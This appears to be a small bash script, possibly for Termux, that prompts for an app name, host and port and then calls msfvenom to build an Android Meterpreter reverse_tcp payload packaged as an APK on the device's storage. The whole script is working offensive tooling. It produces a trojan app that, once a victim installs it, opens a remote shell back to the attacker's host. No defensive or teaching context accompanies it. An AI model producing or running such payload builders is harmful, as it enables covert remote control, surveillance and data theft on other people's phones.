cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
echo -e "$red"
read -p "NAME APK : " name
echo -e "$yellow"
read -p "HOST : " host
echo -e "$green"
read -p "PORT : " port

echo -e "$red please $green waite$blue download....."

        cd $HOME
        msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port -o /sdcard/$name.apk
